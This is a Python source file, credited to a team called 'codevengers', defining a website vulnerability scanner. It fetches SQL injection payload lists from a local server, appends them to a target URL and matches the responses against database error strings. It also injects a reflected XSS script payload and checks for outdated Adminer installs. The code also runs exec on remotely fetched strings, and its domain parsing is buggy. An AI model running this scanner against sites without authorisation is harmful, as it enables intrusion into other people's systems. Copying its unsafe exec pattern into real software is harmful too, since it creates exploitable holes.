"""

copyright codevengers 2021

This source code has been powered by codevengers team.

"""

# Coduri pentru erori
{
    "200": "valid",
    "400": "invalid",
    "504": "dependente",
    "248": "internet",
    "358": "eroare"
}

def check(url=None):
    import os, time, sys

    try:
        import requests, threading, random
        import platform
        import re, whois
    except:
        return 504
    if url is None:
        return 358
    setup = {
        "search": "",
        "http": "",
        "name": "",
        "subdomain": "",
        "domain_ends": "",
        "parameters": [],
        "db": "",
        "os": "",
        "emails": [],
        "passwords": [],
        "usernames": [],
        "other-data": [],
        "url": url,
        "adminer": False,
        "adminer-version": "unknown",
        "injection-type": "unknown",
        "injected-url": "unknown",
        "xss": False,
        "xss-url": ""
    }

    sql_payloads = {
        "GenericBlind": "http://127.0.0.1:5000/injections/GenericBlind",
        "Generic_ErrorBased": "http://127.0.0.1:5000/injections/Generic_ErrorBased",
        "Generic_SQLI": "http://127.0.0.1:5000/injections/Generic_SQLI",
        "Generic_TimeBased": "http://127.0.0.1:5000/injections/Generic_TimeBased",
        "Generic_UnionSelect": "http://127.0.0.1:5000/injections/Generic_UnionSelect"
    }

    responses_sql = {
        "Fatal error:",
        "error in your SQL syntax",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "Error Occurred While Processing Request",
        "Server Error in '/' Application",
        "mysql_fetch_row()",
        "Syntax error",
        "mysql_fetch_assoc()",
        "mysql_fetch_object()",
        "mysql_numrows()",
        "GetArray()",
        "FetchRow()",
        "Input string was not in a correct format",
        "You have an error in your SQL syntax",
        "Warning: session_start()",
        "Warning: is_writable()",
        "Warning: Unknown()",
        "Warning: mysql_result()",
        "Warning: mysql_query()",
        "Warning: mysql_num_rows()",
        "Warning: array_merge()",
        "Warning: preg_match()",
        "SQL syntax error",
        "MYSQL error message: supplied argument….",
        "mysql error with query"
    }

    regex = '(http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
    search = re.findall(regex, url)
    setup['http'] = search[0][0]
    setup['search'] = search[0][2]
    if len(search[0][1].split('.')) == 1:
        setup['domain_ends'] = search[0][1].split('.')[1]
        setup['name'] = search[0][1].split('.')[0]
    else:
        setup['domain_ends'] = search[0][1].split('.')[len(search[0][1].split('.'))-1]
        setup['name'] = search[0][1].split('.')[len(search[0][1].split('.'))-2]
        for each in search[0][1].split('.'):
            if each != search[0][1].split('.')[len(search[0][1].split('.'))-1] and each != search[0][1].split('.')[len(search[0][1].split('.'))-2]:
                setup['subdomain']+=str(each)+'.'
        setup['subdomain'] = setup['subdomain'][:len(setup['subdomain'])-1]

    url_to_check = url.split(setup['search'])[0]

    for each in sql_payloads:
        exec('{0} = requests.get(sql_payloads["{0}"]).text'.format(str(each)))
    for each in sql_payloads:
        exec("{0} = str({0}).split('\\n')".format(str(each)))
        exec('{0}_choose = random.choice({0})'.format(str(each)))
        exec(
            """r = requests.get(setup['url'] + {0}_choose)
for each_el in responses_sql:
    if each_el in r.text:
        setup['injection-type'] = each
        setup['injected-url'] = setup['url'] + {0}_choose
        break""".format(each)
        )
        if setup['injection-type'] != 'unknown':
            break
    try:
        url = setup['url']
        url = url.replace(setup['url'][setup['url'].rfind('=')+1], '%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E')
        r = requests.get(url)
        if '"><script' in r.text:
            if '=' in setup['url']:
                setup['xss'] = True
                setup['xss-url'] = url
    except:
        setup['xss'] = None


    try:
        r = requests.get(url_to_check + '/adminer.php', headers={}).text
        version = re.search('<span class="version">(.*?)</span>', str(r)).group(1)
        nr1 = version.split('.')[0]
        nr2 = version.split('.')[1]
        nr3 = version.split('.')[2]
        number = nr1+nr2+nr3
        setup['adminer-version'] = str(version)
        if int(number) < 462:
            setup['adminer'] = True
        else:
            setup['adminer'] = False
    except:
        setup['adminer'] = False
    return setup
